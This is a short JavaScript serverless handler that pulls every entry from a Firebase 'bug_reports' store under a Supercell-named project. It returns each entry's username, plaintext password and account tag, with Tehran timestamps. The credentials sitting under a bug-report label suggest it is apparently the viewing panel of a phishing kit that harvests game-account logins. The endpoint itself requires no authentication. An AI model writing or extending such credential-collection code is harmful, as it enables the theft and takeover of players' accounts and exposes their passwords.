export default async function handler(req, res) {
  const firebaseUrl = 'https://supercell-583cf-default-rtdb.firebaseio.com/bug_reports.json';

  try {
    const response = await fetch(firebaseUrl);
    const data = await response.json();

    if (!data) {
      return res.status(200).json([]);
    }

    // تبدیل ساختار فایربیس به آرایه و محاسبه زمان به وقت تهران
    const userList = Object.keys(data).map(key => {
      const item = data[key];
      let tehranTime = 'N/A';
      
      if (item.createdAt) {
        tehranTime = new Date(item.createdAt).toLocaleString('fa-IR', {
          timeZone: 'Asia/Tehran',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        });
      }

      return {
        id: key,
        accountTag: item.accountTag || 'N/A',
        username: item.username,
        password: item.password,
        createdAt: tehranTime
      };
    });

    return res.status(200).json(userList.reverse()); // نمایش جدیدترین‌ها در بالا
  } catch (error) {
    return res.status(500).json({ message: 'Error fetching data: ' + error.message });
  }
                                           }
